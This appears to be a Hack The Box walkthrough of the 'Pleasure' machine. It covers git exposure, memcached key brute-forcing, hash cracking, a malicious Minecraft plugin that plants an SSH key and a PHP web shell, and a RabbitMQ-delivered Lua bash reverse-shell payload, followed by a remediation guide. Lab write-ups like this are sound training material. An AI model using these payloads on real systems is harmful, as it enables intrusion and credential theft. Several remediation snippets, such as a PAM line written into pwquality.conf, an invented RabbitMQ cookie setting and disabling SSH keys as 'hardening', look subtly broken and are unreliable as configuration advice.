---
title: "Pleasure HTB - Insane Linux Box Walkthrough"
date: 2025-09-22T08:00:00Z
tags: ["insane-linux", "minecraft", "git-exposure", "memcached", "gogs", "java-plugin", "rabbitmq", "packet-capture", "privilege-escalation", "lua-scripting"]
difficulty: ["insane"]
categories: ["HTB", "Linux"]
draft: false
description: "Complete walkthrough of Pleasure HTB machine featuring Git repository exposure, Memcached exploitation, Minecraft plugin development for RCE, packet capture analysis, and RabbitMQ exploitation with Lua scripting"
---

# Pleasure HTB - Insane Linux Box Walkthrough

{{< youtube F6oSpOWOjSQ >}}

Below is a chronological extraction of the key exploitation steps and techniques used in the "Pleasure" machine from Hack The Box, as described in the provided transcript. The steps are derived from the detailed walkthrough and organized to reflect the sequence of actions taken to gain initial access, escalate privileges, and achieve the final objective.

## Key Exploitation Steps and Techniques in Chronological Order

1. **Initial Reconnaissance with Nmap (Full Port Scan)**
   - **Technique**: Performed a full port scan using `nmap -p- -oA allports -v [TARGET-IP]` to identify open ports on the target machine.
   - **Purpose**: Discover all open ports beyond the default top 1000, as hints in the box suggested non-standard ports were relevant.
   - **Outcome**: Identified multiple open ports, including 22 (SSH), 80 (HTTP), 3000 (Gogs), 11211 (Memcached), and others related to Minecraft and RabbitMQ.

2. **Web Enumeration and Virtual Host Discovery**
   - **Technique**: Accessed the web server at `[TARGET-IP]` and identified a Minecraft-themed page ("Worst Minecraft Server"). Noticed a link to `test.deplasher.htb`, indicating virtual hosting. Added `[TARGET-IP] deplasher.htb test.deplasher.htb` to `/etc/hosts` for name resolution.
   - **Purpose**: Explore the web application and identify potential virtual hosts for further enumeration.
   - **Outcome**: Confirmed virtual host `test.deplasher.htb` and identified a staff page listing potential usernames: `minotau`, `fella_moss`, and `yanto`.

3. **Reverse Image Search for Application Identification**
   - **Technique**: Saved an icon from the staff page, performed a reverse image search via Google Images, and identified it as belonging to Gogs (a self-hosted Git service) running on port 3000.
   - **Purpose**: Determine the application running on port 3000 to understand its functionality and potential vulnerabilities.
   - **Outcome**: Confirmed Gogs at `http://[TARGET-IP]:3000`, providing a potential attack vector.

4. **Directory Enumeration with Gobuster**
   - **Technique**: Ran `gobuster dir -u http://deplasher.htb -w /opt/seclists/Discovery/Web-Content/raft-small-directories.txt -o gobuster.test.out` to enumerate directories and confirmed the web server used PHP by testing `index.php`.
   - **Purpose**: Identify hidden directories or endpoints that could reveal additional attack surfaces.
   - **Outcome**: Discovered a `/login` endpoint and confirmed the web server was running PHP, suggesting potential PHP-based vulnerabilities.

5. **Git Repository Exposure and Credential Extraction**
   - **Technique**: Used Nmap script scans (`nmap -sC -sV -oA nmap/deplasher -p <open_ports> [TARGET-IP]`) to identify a `.git` repository at `http://test.deplasher.htb/.git`. Downloaded it using `git-dumper` and analyzed `index.php`, which revealed Memcached credentials (`thalamos` with a password).
   - **Purpose**: Exploit exposed Git repository to extract sensitive information like credentials or configuration details.
   - **Outcome**: Obtained Memcached credentials, indicating Memcached was running on port 11211 with SASL authentication.

6. **Memcached Brute-Forcing for Sensitive Data**
   - **Technique**: Connected to Memcached (`nc [TARGET-IP] 11211` failed due to authentication). Installed `libmemcached-tools` and used `memccat` with credentials (`memccat --username thalamos --password <password> --servers=[TARGET-IP]:11211`). Created a PHP script to brute-force Memcached keys via a local web server (`php -S 127.0.0.1:80`) and used `wfuzz` with a wordlist (`wfuzz -w /opt/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u http://127.0.0.1/?cmd=FUZZ --hw 0`).
   - **Purpose**: Extract sensitive data stored in Memcached by guessing keys.
   - **Outcome**: Retrieved keys like `username`, `password`, and `email`, yielding credentials (`fella_moss:mommy1`, `yanto:<password>`, and `moss@deplasher.htb:alexis1`).

7. **Password Cracking with Hashcat**
   - **Technique**: Identified bcrypt hashes in Memcached output and cracked them using Hashcat (`hashcat -m 3200 ./hashes/deplasher /opt/wordlists/rockyou.txt`).
   - **Purpose**: Crack hashed passwords to gain valid credentials for authentication.
   - **Outcome**: Cracked `mommy1` for `fella_moss` and `alexis1` for an unknown user (later associated with `moss@deplasher.htb`).

8. **Gogs Login and Repository Analysis**
   - **Technique**: Attempted SSH login with `fella_moss:mommy1` (failed), then logged into Gogs at `http://[TARGET-IP]:3000` using the same credentials. Downloaded a repository (`repo.zip`) containing a GitLab backup and a `login_security.jar` file, identified as a Minecraft plugin.
   - **Purpose**: Access Gogs to find exploitable repositories or plugins.
   - **Outcome**: Obtained a Minecraft plugin and a `users.db` SQLite database containing another bcrypt hash, cracked as `alexis1`.

9. **Minecraft Admin Panel Access and Plugin Upload**
   - **Technique**: Logged into the Minecraft admin panel at `http://deplasher.htb/login` using `moss@deplasher.htb:alexis1`. Identified a plugin upload feature in the admin console.
   - **Purpose**: Gain access to the Minecraft server's admin panel to upload a malicious plugin for code execution.
   - **Outcome**: Successfully logged in and identified the plugin upload functionality as a key attack vector.

10. **Crafting and Uploading a Malicious Minecraft Plugin**
    - **Technique**: Set up a development environment on a clean Ubuntu VM with OpenJDK (`sudo apt install openjdk-8-jdk`) and IntelliJ IDEA. Followed a guide to create a Spigot plugin using Maven, with a `pom.xml` configuration and a `plugin.yml` file. Created a Java plugin (`ipsec`) that, on enable, reads `/etc/passwd` and retrieves the system username (`System.getProperty("user.name")`). Built the plugin (`mvn package`), transferred it via Netcat, and uploaded it to the Minecraft admin panel.
    - **Purpose**: Achieve code execution by uploading a malicious Java plugin that runs on the Minecraft server.
    - **Outcome**: Plugin executed, revealing the `/etc/passwd` contents and the user `minotau`.

11. **Privilege Escalation via SSH Key Injection**
    - **Technique**: Modified the plugin to write an SSH public key to `/home/minotau/.ssh/authorized_keys` and a PHP web shell to `/var/www/html` and `/var/www/test.deplasher.htb/please_subscribe.php`. Rebuilt and re-uploaded the plugin (version 2.0). Used the generated SSH key to log in as `minotau` (`ssh -i ipsec minotau@[TARGET-IP]`).
    - **Purpose**: Gain persistent access as the `minotau` user and establish a web shell for further interaction.
    - **Outcome**: Successfully logged in as `minotau` and accessed a PHP web shell (`http://test.deplasher.htb/please_subscribe.php?cmd=id`), confirming code execution.

12. **Packet Capture for Further Enumeration**
    - **Technique**: As `minotau`, ran `dumpcap -i lo -w /dev/shm/out.pcap` to capture network traffic, leveraging the Wireshark group capability. Transferred the capture file (`out.pcap`) via SCP, analyzed it with Wireshark, and identified AMQP (RabbitMQ) traffic containing credentials (`yanto:<password>`).
    - **Purpose**: Capture network traffic to identify additional credentials or services for escalation.
    - **Outcome**: Obtained `yanto`'s password and logged in via `su yanto`, revealing a hint about submitting Cuberite plugins via RabbitMQ.

13. **Exploiting RabbitMQ for Cuberite Plugin Execution**
    - **Technique**: Used `amqp-publish` to send a URL (`http://127.0.0.1:9001/please_subscribe.lua`) to the RabbitMQ queue (`plugin_data`). Hosted a malicious Lua script (`os.execute("bash -c 'bash -i >& /dev/tcp/127.0.0.1/9002 0>&1'")`) on a local web server (`python3 -m http.server 9001`) and listened for a reverse shell (`nc -lvnp 9002`).
    - **Purpose**: Achieve root code execution by submitting a malicious Cuberite plugin via RabbitMQ.
    - **Outcome**: Successfully obtained a root shell, allowing access to `root.txt`.

14. **Firewall Enumeration and Additional Exploitation Attempt**
    - **Technique**: As root, enumerated firewall rules using `ufw status numbered` and `iptables -L -n`, identifying that port 11211 (Memcached) was allowed bidirectionally. Attempted to exploit the Erlang cookie (`/var/lib/rabbitmq/.erlang.cookie`) for RabbitMQ but failed due to unfamiliarity with Erlang's `net_kernel:connect/1`.
    - **Purpose**: Explore additional attack vectors (Erlang cookie for RabbitMQ cluster access) and understand firewall restrictions.
    - **Outcome**: Confirmed Memcached's bidirectional access as a potential reverse shell port but did not pursue Erlang exploitation further due to complexity.

## Summary
The exploitation process involved:
- **Initial Access**: Gained through a malicious Minecraft plugin uploaded via the admin panel, exploiting the plugin system's ability to execute arbitrary Java code.
- **Privilege Escalation**: Achieved by writing an SSH key for `minotau` and a PHP web shell, followed by capturing network traffic to obtain `yanto`'s credentials, and finally submitting a malicious Lua script via RabbitMQ to gain a root shell.
- **Key Techniques**: Nmap scanning, virtual host enumeration, reverse image search, Git repository dumping, Memcached brute-forcing, password cracking, Java plugin development, SSH key injection, packet capture with Wireshark, and RabbitMQ exploitation with a Lua script.

This sequence reflects the attacker's progression from reconnaissance to root access, leveraging multiple vulnerabilities in the Minecraft server, Memcached, and RabbitMQ systems.

## Security Gaps and Remediation

Below is a detailed analysis of the gaps in each service or system identified in the "Pleasure" machine from Hack The Box, as described in the provided transcript. For each gap, I've outlined the vulnerability, its impact, and recommended fixes, focusing on proper source code or configuration changes to secure the systems. The fixes are designed to address the specific vulnerabilities exploited in the walkthrough while ensuring the systems remain functional.

---

### 1. Web Server (Apache/Nginx with PHP)
**Gaps and Vulnerabilities**:
- **Exposed `.git` Repository**:
  - **Description**: The `.git` directory was accessible at `http://test.deplasher.htb/.git`, allowing attackers to download the repository and extract sensitive information, such as Memcached credentials in `index.php`.
  - **Impact**: Exposure of source code and credentials enabled further exploitation, including Memcached access and authentication bypass.
- **Virtual Host Misconfiguration**:
  - **Description**: The virtual host `test.deplasher.htb` was not properly restricted, allowing enumeration and access to sensitive endpoints like the `.git` directory.
  - **Impact**: Attackers could identify and target additional services or misconfigurations on the virtual host.
- **PHP Web Shell Execution**:
  - **Description**: The attacker wrote a PHP web shell (`please_subscribe.php`) to `/var/www/test.deplasher.htb/`, which executed arbitrary commands due to insufficient input validation and file write permissions.
  - **Impact**: Enabled arbitrary code execution, leading to persistent access as the `minotau` user.

**Recommended Fixes**:
- **Prevent `.git` Directory Exposure**:
  - **Configuration Fix**:
    - Add a rule in the web server configuration to deny access to `.git` directories. For Apache:
      ```apache
      <DirectoryMatch "^/.*/\.git/">
          Deny from all
      </DirectoryMatch>
      ```
      For Nginx:
      ```nginx
      location ~ /\.git {
          deny all;
      }
      ```
    - Alternatively, disable directory indexing to prevent listing of sensitive directories:
      ```apache
      Options -Indexes
      ```
  - **Source Code Fix**: Ensure no sensitive files (e.g., `.git`) are included in the web root during deployment. Use a `.gitignore` file to exclude sensitive directories and automate deployment to avoid manual errors.
- **Secure Virtual Host Configuration**:
  - **Configuration Fix**:
    - Restrict access to virtual hosts by implementing IP whitelisting or authentication for sensitive endpoints. For Apache:
      ```apache
      <VirtualHost *:80>
          ServerName test.deplasher.htb
          <Location />
              Require ip 127.0.0.1 10.10.10.0/24
          </Location>
      </VirtualHost>
      ```
    - Use `ServerAlias` carefully and avoid exposing unintended subdomains.
  - **Source Code Fix**: Audit the application to ensure no sensitive endpoints are exposed without authentication.
- **Prevent Arbitrary File Writes**:
  - **Configuration Fix**:
    - Restrict write permissions on the web root (`/var/www/html`, `/var/www/test.deplasher.htb`) to prevent unauthorized file creation. Set ownership and permissions:
      ```bash
      chown -R www-data:www-data /var/www
      chmod -R 755 /var/www
      ```
    - Use a dedicated upload directory with strict permissions and disable PHP execution in that directory:
      ```apache
      <Directory /var/www/uploads>
          php_flag engine off
      </Directory>
      ```
  - **Source Code Fix**:
    - Implement strict input validation and sanitization in the PHP application to prevent arbitrary file writes. For example, validate file extensions and content types:
      ```php
      $allowed_extensions = ['txt', 'pdf'];
      if (!in_array($file_extension, $allowed_extensions)) {
          die("Invalid file type");
      }
      ```
    - Use a secure file upload mechanism with a whitelist approach and store files outside the web root.

---

### 2. Memcached Service
**Gaps and Vulnerabilities**:
- **Weak Authentication**:
  - **Description**: Memcached on port 11211 used SASL authentication with credentials (`thalamos:<password>`) stored in an exposed `.git` repository, which were easily extracted.
  - **Impact**: Allowed attackers to authenticate and access sensitive data (usernames, passwords, emails) stored in Memcached.
- **Unrestricted Key Access**:
  - **Description**: Attackers could brute-force Memcached keys using tools like `memccat` and `wfuzz`, retrieving sensitive data without restrictions.
  - **Impact**: Exposed critical credentials, enabling further system access.
- **Bidirectional Firewall Rule**:
  - **Description**: The firewall rule for port 11211 allowed both inbound and outbound connections, potentially enabling reverse shell communication.
  - **Impact**: Facilitated data exfiltration and potential command execution.

**Recommended Fixes**:
- **Secure Authentication**:
  - **Configuration Fix**:
    - Use strong, unique credentials for Memcached SASL authentication. Store credentials securely (e.g., in a configuration file outside the web root with restricted permissions):
      ```bash
      chown root:root /etc/memcached.conf
      chmod 600 /etc/memcached.conf
      ```
    - Enable SASL authentication if not already enabled and disable anonymous access:
      ```bash
      memcached -S -u memcached
      ```
  - **Source Code Fix**: Avoid storing sensitive credentials in source code. Use environment variables or a secrets management system (e.g., HashiCorp Vault) to manage credentials securely.
- **Restrict Key Access**:
  - **Configuration Fix**:
    - Implement key prefixing or namespaces to segregate sensitive data and restrict access to specific keys based on user roles.
    - Limit Memcached access to specific IP addresses using firewall rules:
      ```bash
      ufw allow from 127.0.0.1 to any port 11211
      ufw deny 11211
      ```
  - **Source Code Fix**:
    - Implement access controls in the application interacting with Memcached to validate key requests and prevent unauthorized access.
    - Use encryption for sensitive data stored in Memcached to mitigate data exposure if accessed:
      ```php
      $encrypted_data = encrypt($data, $key);
      $memcached->set($key, $encrypted_data);
      ```
- **Fix Bidirectional Firewall Rule**:
  - **Configuration Fix**:
    - Restrict Memcached to inbound-only connections from trusted sources:
      ```bash
      ufw allow from 127.0.0.1 to any port 11211 proto tcp
      ufw deny out 11211
      ```
    - Regularly audit firewall rules to ensure no unintended bidirectional access is allowed.

---

### 3. Gogs (Git Service)
**Gaps and Vulnerabilities**:
- **Weak Credentials**:
  - **Description**: The Gogs instance on port 3000 allowed login with cracked credentials (`fella_moss:mommy1`), which were obtained from Memcached.
  - **Impact**: Provided access to repositories containing sensitive data, such as Minecraft plugins and backups.
- **Unrestricted Repository Access**:
  - **Description**: Repositories were accessible without additional access controls, allowing the attacker to download a backup (`repo.zip`) containing a Minecraft plugin and a SQLite database.
  - **Impact**: Enabled further exploitation through plugin analysis and credential extraction.

**Recommended Fixes**:
- **Strengthen Authentication**:
  - **Configuration Fix**:
    - Enforce strong password policies for Gogs users and implement multi-factor authentication (MFA) if supported.
    - Configure Gogs to use secure session management and limit login attempts:
      ```ini
      [security]
      LOGIN_ATTEMPTS = 3
      ```
  - **Source Code Fix**: Ensure the application enforces strong password validation and integrates with an external authentication provider (e.g., LDAP) for better credential management.
- **Restrict Repository Access**:
  - **Configuration Fix**:
    - Configure Gogs to restrict repository access to authorized users only. Set repositories to private by default:
      ```ini
      [repository]
      DEFAULT_PRIVATE = true
      ```
    - Implement role-based access control (RBAC) to limit who can view or download repositories.
  - **Source Code Fix**: Add checks in the Gogs application to enforce repository permissions before allowing downloads, ensuring only authorized users can access sensitive data.

---

### 4. Minecraft Server (Spigot)
**Gaps and Vulnerabilities**:
- **Insecure Plugin Upload**:
  - **Description**: The Minecraft admin panel at `http://deplasher.htb/login` allowed authenticated users to upload Java plugins without validation, which executed arbitrary code on the server.
  - **Impact**: Enabled initial code execution, allowing the attacker to read `/etc/passwd` and write files (e.g., SSH keys, web shells).
- **Lack of Plugin Validation**:
  - **Description**: Uploaded plugins were executed without signature verification or sandboxing, allowing malicious code to run with server privileges.
  - **Impact**: Facilitated privilege escalation by executing attacker-controlled code as the `minotau` user.

**Recommended Fixes**:
- **Secure Plugin Upload Mechanism**:
  - **Configuration Fix**:
    - Restrict plugin upload permissions to high-privilege users and require manual approval for uploads.
    - Configure the Minecraft server to run plugins in a sandboxed environment (e.g., using a restricted JVM or container).
  - **Source Code Fix**:
    - Implement strict validation for uploaded plugins, such as checking file signatures or whitelisting trusted plugins:
      ```java
      if (!verifyPluginSignature(pluginFile, trustedKey)) {
          throw new SecurityException("Invalid plugin signature");
      }
      ```
    - Limit plugin capabilities to prevent file system access unless explicitly allowed.
- **Enable Plugin Sandboxing**:
  - **Configuration Fix**:
    - Use a plugin like `NoCheatPlus` or a custom security plugin to monitor and restrict plugin behavior.
    - Run the Minecraft server with reduced privileges (e.g., as a non-root user with minimal file system access):
      ```bash
      useradd -r minecraft
      chown -R minecraft:minecraft /path/to/minecraft
      ```
  - **Source Code Fix**: Modify the Spigot server to enforce a security manager that restricts plugin access to sensitive resources:
      ```java
      System.setSecurityManager(new SecurityManager() {
          @Override
          public void checkRead(String file) {
              if (file.startsWith("/etc")) {
                  throw new SecurityException("Access denied");
              }
          }
      });
      ```

---

### 5. RabbitMQ (AMQP)
**Gaps and Vulnerabilities**:
- **Insecure Message Queue Processing**:
  - **Description**: The RabbitMQ service processed messages from the `plugin_data` queue without validating the content, allowing the attacker to submit a malicious Lua script URL that was executed by the Cuberite server.
  - **Impact**: Enabled root code execution via a Lua script that ran `os.execute` to open a reverse shell.
- **Exposed Credentials in Network Traffic**:
  - **Description**: AMQP traffic captured via `dumpcap` contained plaintext credentials (`yanto:<password>`), indicating a lack of encryption.
  - **Impact**: Allowed attackers to extract and use credentials for further access.
- **Erlang Cookie Exposure**:
  - **Description**: The Erlang cookie (`/var/lib/rabbitmq/.erlang.cookie`) was readable by the root user, potentially allowing cluster access if exploited.
  - **Impact**: Could enable unauthorized control of the RabbitMQ cluster, though not fully exploited in this case.

**Recommended Fixes**:
- **Validate Message Queue Content**:
  - **Configuration Fix**:
    - Configure RabbitMQ to restrict queue access to trusted users and applications:
      ```bash
      rabbitmqctl set_permissions -p / yanto "plugin_data$" "" ""
      ```
    - Implement a message validation plugin to scan incoming messages for malicious content.
  - **Source Code Fix**:
    - Modify the Cuberite server to validate Lua scripts before execution, ensuring they do not contain dangerous functions like `os.execute`:
      ```lua
      if string.match(script_content, "os%.execute") then
          error("Dangerous function detected")
      end
      ```
    - Use a Lua sandbox to restrict script capabilities:
      ```lua
      local safe_env = { print = print }
      setfenv(script_function, safe_env)
      ```
- **Encrypt AMQP Traffic**:
  - **Configuration Fix**:
    - Enable TLS for RabbitMQ to encrypt AMQP traffic:
      ```ini
      [{rabbit, [
          {tcp_listeners, []},
          {ssl_listeners, [5671]},
          {ssl_options, [{cacertfile, "/path/to/ca.pem"},
                         {certfile, "/path/to/server.pem"},
                         {keyfile, "/path/to/key.pem"}]}
      ]}].
      ```
    - Ensure credentials are not sent in plaintext by using secure authentication mechanisms.
  - **Source Code Fix**: Update the application interacting with RabbitMQ to use encrypted channels and avoid logging sensitive data in messages.
- **Secure Erlang Cookie**:
  - **Configuration Fix**:
    - Restrict file permissions on the Erlang cookie:
      ```bash
      chown rabbitmq:rabbitmq /var/lib/rabbitmq/.erlang.cookie
      chmod 400 /var/lib/rabbitmq/.erlang.cookie
      ```
    - Limit RabbitMQ cluster access to trusted nodes by configuring node authentication:
      ```ini
      [{rabbit, [{auth_mechanisms, ['PLAIN', 'AMQPLAIN']}, {cookie, "strong_cookie_value"}]}].
      ```
  - **Source Code Fix**: Ensure applications do not expose the Erlang cookie in logs or network traffic.

---

### 6. SSH Service
**Gaps and Vulnerabilities**:
- **Unauthorized Key Injection**:
  - **Description**: The attacker wrote an SSH public key to `/home/minotau/.ssh/authorized_keys` using the malicious Minecraft plugin, allowing unauthorized SSH access.
  - **Impact**: Provided persistent access as the `minotau` user without needing valid credentials.
- **Weak File Permissions**:
  - **Description**: The `.ssh` directory and `authorized_keys` file were writable by the Minecraft server process, allowing key injection.
  - **Impact**: Enabled unauthorized access to the `minotau` account.

**Recommended Fixes**:
- **Prevent Unauthorized Key Injection**:
  - **Configuration Fix**:
    - Restrict SSH access to password authentication only or require MFA:
      ```bash
      echo "PubkeyAuthentication no" >> /etc/ssh/sshd_config
      systemctl restart sshd
      ```
    - Alternatively, use a restricted `AuthorizedKeysFile` location with strict permissions:
      ```bash
      echo "AuthorizedKeysFile /etc/ssh/authorized_keys/%u" >> /etc/ssh/sshd_config
      mkdir -p /etc/ssh/authorized_keys
      chown root:root /etc/ssh/authorized_keys
      chmod 700 /etc/ssh/authorized_keys
      ```
  - **Source Code Fix**: Ensure the Minecraft server cannot write to user home directories or SSH configuration files by running it in a restricted environment.
- **Secure File Permissions**:
  - **Configuration Fix**:
    - Set strict permissions on user home directories and `.ssh` folders:
      ```bash
      chown minotau:minotau /home/minotau
      chmod 700 /home/minotau
      chmod 700 /home/minotau/.ssh
      chmod 600 /home/minotau/.ssh/authorized_keys
      ```
    - Regularly audit file permissions to ensure no unintended write access exists.

---

### 7. Firewall (UFW)
**Gaps and Vulnerabilities**:
- **Overly Permissive Rules**:
  - **Description**: UFW rules allowed bidirectional access on port 11211 (Memcached), potentially enabling reverse shell communication. The attacker noted that ports like 11211 were allowed both inbound and outbound, possibly due to a misconfigured rule like `ufw allow 11211`.
  - **Impact**: Facilitated data exfiltration and potential command execution via open ports.
- **Lack of Rule Auditing**:
  - **Description**: The firewall configuration was not regularly audited, allowing misconfigured rules to persist.
  - **Impact**: Enabled attackers to exploit open ports for unintended purposes.

**Recommended Fixes**:
- **Restrict Firewall Rules**:
  - **Configuration Fix**:
    - Explicitly define inbound and outbound rules to prevent bidirectional access:
      ```bash
      ufw allow in from 127.0.0.1 to any port 11211 proto tcp
      ufw deny out 11211
      ```
    - Default to a deny-all policy for outbound traffic unless explicitly allowed:
      ```bash
      ufw default deny outgoing
      ```
  - **Source Code Fix**: Not applicable, as this is a configuration issue.
- **Implement Regular Auditing**:
  - **Configuration Fix**:
    - Schedule periodic firewall rule audits using a script:
      ```bash
      #!/bin/bash
      ufw status numbered > /var/log/ufw_audit.log
      ```
    - Use monitoring tools like `fail2ban` to detect and block suspicious activity on open ports.

---

### 8. General System Security
**Gaps and Vulnerabilities**:
- **Weak Passwords**:
  - **Description**: Passwords like `mommy1` and `alexis1` were easily cracked using `rockyou.txt`, indicating weak password policies.
  - **Impact**: Enabled unauthorized access to multiple services (Gogs, Minecraft admin panel, SSH).
- **Unnecessary Service Exposure**:
  - **Description**: Services like Memcached, Gogs, and RabbitMQ were exposed to the network without sufficient access controls.
  - **Impact**: Increased attack surface, allowing enumeration and exploitation of multiple services.
- **Privilege Misconfiguration**:
  - **Description**: The `minotau` user was part of the `wireshark` group, granting `dumpcap` capabilities to capture network traffic, which revealed sensitive credentials.
  - **Impact**: Facilitated privilege escalation by exposing credentials in network traffic.

**Recommended Fixes**:
- **Enforce Strong Password Policies**:
  - **Configuration Fix**:
    - Configure system-wide password policies using PAM:
      ```bash
      echo "password requisite pam_pwquality.so retry=3 minlen=12 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1" >> /etc/security/pwquality.conf
      ```
    - Require password changes for all users and audit existing passwords:
      ```bash
      chage -M 90 minotau
      ```
  - **Source Code Fix**: Implement password strength checks in applications (e.g., Gogs, Minecraft admin panel) to reject weak passwords.
- **Minimize Service Exposure**:
  - **Configuration Fix**:
    - Bind services to localhost where possible (e.g., Memcached, RabbitMQ):
      ```bash
      echo "listen 127.0.0.1:11211" >> /etc/memcached.conf
      ```
    - Use a reverse proxy with authentication to protect services like Gogs:
      ```nginx
      location /gogs {
          proxy_pass http://127.0.0.1:3000;
          auth_basic "Restricted Access";
          auth_basic_user_file /etc/nginx/.htpasswd;
      }
      ```
  - **Source Code Fix**: Ensure applications validate client IP addresses before processing requests.
- **Restrict Privileges**:
  - **Configuration Fix**:
    - Remove unnecessary group memberships (e.g., `wireshark` for `minotau`):
      ```bash
      deluser minotau wireshark
      ```
    - Audit capabilities on binaries like `dumpcap` and remove unnecessary ones:
      ```bash
      setcap -r /usr/bin/dumpcap
      ```
  - **Source Code Fix**: Not applicable, as this is a configuration issue.

---

### Summary of Fixes
The vulnerabilities in the "Pleasure" machine stemmed from misconfigurations, insecure coding practices, and inadequate access controls across multiple services. Key fixes include:
- **Web Server**: Block `.git` exposure, secure virtual hosts, and prevent arbitrary file writes.
- **Memcached**: Strengthen authentication, restrict key access, and fix firewall rules.
- **Gogs**: Enforce strong credentials and restrict repository access.
- **Minecraft Server**: Validate and sandbox plugins to prevent code execution.
- **RabbitMQ**: Validate queue messages, encrypt traffic, and secure the Erlang cookie.
- **SSH**: Prevent unauthorized key injection and secure file permissions.
- **Firewall**: Restrict bidirectional rules and implement regular auditing.
- **General**: Enforce strong passwords, minimize service exposure, and restrict user privileges.

Implementing these fixes ensures the systems are hardened against the specific attack vectors exploited, while maintaining their intended functionality. Regular audits and monitoring should be established to prevent future misconfigurations.

## Conclusion

Pleasure is an excellent machine that demonstrates the complexity of modern gaming server environments and the interconnected nature of multiple services. It requires expertise in:
- Web application security and Git repository exploitation
- Memcached authentication and data extraction techniques
- Java development and Minecraft plugin creation for RCE
- Network packet analysis and credential harvesting
- RabbitMQ message queue exploitation with Lua scripting
- Multi-service privilege escalation and lateral movement

The machine emphasizes the importance of securing development environments, implementing proper authentication mechanisms, and maintaining strong isolation between services in complex multi-service architectures.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*